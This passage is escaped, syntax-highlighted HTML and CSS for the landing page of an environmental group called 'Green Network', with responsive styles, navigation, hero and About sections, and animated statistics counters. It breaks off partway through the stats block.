&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .stats &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                grid-template-columns: repeat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2, 1fr&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        @media &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;max-width: 768px&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .hero h1 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                font-size: 2.8rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Adjusted &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; better readability on smaller screens */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .hero p &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                font-size: 1.2rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Adjusted &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; better readability on smaller screens */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            nav ul &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                display: none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                position: absolute&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                top: 100%&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                left: 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                width: 100%&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--primary&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                flex-direction: column&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                padding: 1rem 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                text-align: center&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                box-shadow: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 5px 10px rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 0, 0, 0.1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            nav ul.active &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                display: flex&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            nav ul li &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                margin: 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                padding: 0.8rem 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .mobile-menu &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                display: block&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                font-size: 1.2rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Slightly smaller &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; mobile */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                padding: 0.4rem 0.8rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .initiatives-grid &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                grid-template-columns: 1fr&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .footer-content &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                grid-template-columns: 1fr&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .stats &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                grid-template-columns: 1fr&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .social-links a &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                width: 45px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Slightly smaller social buttons */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                height: 45px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                font-size: 0.85rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /* Animation &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; stats counter */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .counter &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transition: all 0.5s ease&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/style&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;!-- Header --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;header&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;container nav-container&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;logo&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;span&amp;gt;Green Network&amp;lt;/span&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;nav&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;mobile-menu&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    Menu
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;ul&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#home&amp;#34;&lt;/span&gt;&amp;gt;Home&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#about&amp;#34;&lt;/span&gt;&amp;gt;About&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#initiatives&amp;#34;&lt;/span&gt;&amp;gt;Initiatives&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#get-involved&amp;#34;&lt;/span&gt;&amp;gt;Get Involved&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#contact&amp;#34;&lt;/span&gt;&amp;gt;Contact&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;/ul&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;/nav&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/header&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;!-- Hero Section --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;section &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;hero&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;home&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;container hero-content&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;h1&amp;gt;Protect Our Planet, Preserve Our Future&amp;lt;/h1&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;p&amp;gt;Join the global movement to create a sustainable world through conservation, education, and community action.&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#get-involved&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;btn&amp;#34;&lt;/span&gt;&amp;gt;Join Our Network&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/section&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;!-- About Section --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;section &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;about&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;container&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;section-title&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;h2&amp;gt;About Green Network&amp;lt;/h2&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;p&amp;gt;We are a global community dedicated to environmental protection and sustainable development.&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;about-content&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;about-img&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;img &lt;span class=&#34;nv&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://images.unsplash.com/photo-1507591064344-4c6ce005b128?ixlib=rb-4.0.3&amp;amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&amp;amp;auto=format&amp;amp;fit=crop&amp;amp;w=2070&amp;amp;q=80&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;alt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Team planting trees&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;about-text&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;h3&amp;gt;Our Mission&amp;lt;/h3&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;p&amp;gt;Green Network is committed to creating a sustainable future by protecting natural ecosystems, promoting renewable energy, and empowering communities to take environmental action.&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;p&amp;gt;Founded in 2010, we&lt;span class=&#34;s1&#34;&gt;&amp;#39;ve grown from a small grassroots organization to an international network with over 50,000 members across 120 countries.&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                    &amp;lt;p&amp;gt;Our approach combines scientific research, community engagement, and policy advocacy to address the most pressing environmental challenges of our time.&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                    &amp;lt;a href=&amp;#34;#&amp;#34; class=&amp;#34;btn&amp;#34;&amp;gt;Learn More&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            &amp;lt;div class=&amp;#34;stats&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;div class=&amp;#34;stat-item&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                    &amp;lt;h3 class=&amp;#34;counter&amp;#34; data-target=&amp;#34;2500000&amp;#34;&amp;gt;0&amp;lt;/h3&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                    &amp;lt;p&amp;gt;Trees Planted&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;div class=&amp;#34;stat-item&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                    &amp;lt;h3 class=&amp;#34;counter&amp;#34; data-target=&amp;#34;50000&amp;#34;&amp;gt;0&amp;lt;/h3&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                    &amp;lt;p&amp;gt;Active Members&amp;lt;/p&amp;gt;
